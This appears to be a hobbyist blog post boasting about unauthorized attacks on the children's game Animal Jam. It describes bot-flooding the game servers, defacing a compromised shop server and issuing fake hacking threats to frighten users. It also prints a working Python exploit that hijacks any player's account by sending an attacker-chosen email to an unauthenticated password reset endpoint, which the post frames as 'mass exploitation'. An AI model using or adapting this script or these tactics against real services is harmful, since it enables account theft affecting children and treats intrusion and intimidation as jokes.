---
layout: post
title: "Electric Boogaloo: Hacking Animal Jam"
subtitle: "~ AKA, how we pwned Animal Jam ~"
date: 2021-9-7
author: chob
tags: pentesting
finished: true
excerpt_separator: <!--more-->
---

> **DISCLAIMER**: The aim of this post is not to offend or attack anyone. Instead it is to inform to you the story about how Animal Jam was pwned by us (AstroSquad). I do not condone malicious behavior. Thank you for understanding.

# Preface
As the title suggests, this post will touch on how me and a few other junior security researchers (also nicknamed "AstroSquad") were able to "hack" or "pwn" a poorly secured kids game called "Animal Jam". <!--more--> <br>

This all started when one of our researchers (psuedo named "Moon") looked into Animal Jam, he messed around with the API and told us that there wasn't a rate limit on the RPS (Request Per Second), one of us wrote a script to automate the registration process and made hundreds of bots that joined the game servers which froze players clients. They shortly added rate limit globally to the API. That was only the start, on August 6 2020, another one of our researchers (psuedo named "HellSec") found the IP of one of their boxes, we assumed that we couldn't get into it at first, but within a few hours, we managed to pwn the box. Surprisingly there was not much on the box, it was a AWS box and it was the box for the Animal Jam shop (**shop.animaljam.com**). With a limited time, we made a simple deface page and overwrote it to the index page.

<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/compilation.png" target="_blank"><img class="centerImgMedium" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/compilation.png"></a>

As you can see from the compilation above, they believed we had a apparent "ip logger" and other malicious items, this gave us a notorious reputation as this group of 40 year olds in their mothers basement that are very **1337**, which was not the case. From there, we wanted to test how much the community and the company WildWorks was afraid of apparent fake threats. So around October 2020, we made a threat that we were going to "hack" Animal Jam on halloween, the community freaked and made a bunch of YouTube videos with WildWorks putting their servers on lockdown. It was the biggest lawl for us. <br>

Now that you understand the context before the main pwn; without further ado, let's get into the main pwn. On August 16, 2021, we discovered a 0day **no-auth** full account takeover on Animal Jam. How? simple. A fucking password reset endpoint. Let me repeat that, a fucking **password reset endpoint**, someone must've been some crack while writing the endpoint lol (╯°□°）╯︵ ┻━┻.

****
# Discovering the vulnerability
Basically, one of our researchers used Fiddler to capture all the traffic coming from the Animal Jam application because he was capturing all the traffic he managed to come across the `/disable` endpoint. Every account on Animal Jam is linked to a certain "parent account", and since he got the endpoint for `/disable` he was able to look at the post data (the data that is sent with the post request) he noticed on the post data you were able to send a custom email in the post data so he replaced the email, not expecting anything until.. he recieved a email from Animal Jam and funny enough, once he clicked on the disable account link, it automatically overrided the email that is already linked to the account with the custom email you put in.

<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/lawl.gif" target="_blank"><img class="centerImgSmall" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/lawl.gif"></a>

Only issue with this is that it didn't disable the player, but knowing it did link the account, he searched for other endpoints using Fiddler that had the same post data requirements, until.. he found the `/send_password_reset` endpoint and by sending the request he was able to takeover ANY players account by sending a post request with the generosity with of course, no authentication at all. He then alerted us about this and showed it wasn't a joke on a screenshare.

<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/meme.jpg" target="_blank"><img class="centerImgLarge" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/meme.jpg"></a>

****
# Mass Exploitation
Now we know the vulnerability, how do we use it on a large scale attack? Simple! All we need to do is write a script to send a post request with the post data and the target with a burner email.

### - Writing the exploit using python3
Lets start by making a Python script and then importing the request library for sending the post request and sys for argument handling and then supplying the endpoint with the request:
```python
#!/usr/env/python3
import requests
import sys

class Exploit:

    def __init__(self, username, email):
        self.username = username
        self.email = email

    def execute(self):
        endpoint = f'https://api.animaljam.com/game_account/{username}/send_password_reset/desktop'
        return requests.post(url=endpoint, data={'email': email, 'user_name': username}, headers={'auth': 'null'})

def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <USERNAME> <YOUR_EMAIL>')
        sys.exit()

    username = sys.argv[1]
    email = sys.argv[2]

    Exploit(username, email).execute()

if __name__ == '__main__':
    main()
```
and **PWNED**!! Now you can takeover anyones account just by supplying the username and a burner email lol. <br>
<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/beamed.png" target="_blank"><img class="centerImgSmall" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/beamed.png"></a>

Although it was patched due to the security advisory we released the next day because Animal Jam was having some issues making a patch lol, here's a gif & a image of us on the AJHQ account on the parents dashboard using this exploit.

<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.gif" target="_blank"><img class="centerImgSmall" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.gif"></a>
<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.png" target="_blank"><img class="centerImgLarge" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.png"></a>

****
# Conclusion
This company "Animal Jam" is a example of greed over good security, if any companies are reading this, don't be like these guys, but hey,
thank you for reading if you got this far, this is my first blog i've made and I'll be making more very soon and this was funny fun to make, if you enjoyed reading this, go ahead and share it (ﾟДﾟ)y─┛~~ 
